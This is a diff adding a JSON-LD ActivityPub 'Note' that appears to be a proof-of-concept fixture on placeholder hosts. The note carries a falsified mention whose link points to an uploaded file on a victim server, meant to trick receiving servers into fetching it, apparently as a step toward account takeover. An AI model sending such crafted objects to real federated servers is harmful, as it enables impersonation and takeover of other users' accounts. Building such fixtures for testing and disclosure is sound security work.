@@ -1,0 +1,18 @@
+{
+  "@context": "https://www.w3.org/ns/activitystreams",
+  "id": "https://attacker.poc.example/objects/notes/falsified-victim-mention.jsonld",
+  "type": "Note",
+  "attributedTo": "https://attacker.poc.example/objects/@attacker.jsonld",
+  "content": "MENTIONING FALSIFIED @takeoverVictim@victim.poc.example TO TRICK THE RECEPIENT SERVER INTO FETCHING IT",
+  "published": "2015-02-10T15:04:55Z",
+  "to": "https://www.w3.org/ns/activitystreams#Public",
+  "cc": [
+    "https://attacker.poc.example/objects/@attacker/followers.jsonld",
+    "https://victim.poc.example/files/deadbeef-badb-adba-dbad-aaaaaaaaaaaa"
+  ], 
+  "tag": {
+    "type": "Mention",
+    "href": "https://victim.poc.example/files/deadbeef-badb-adba-dbad-aaaaaaaaaaaa",
+    "name": "@takeoverVictim@victim.poc.example"
+  }
+}
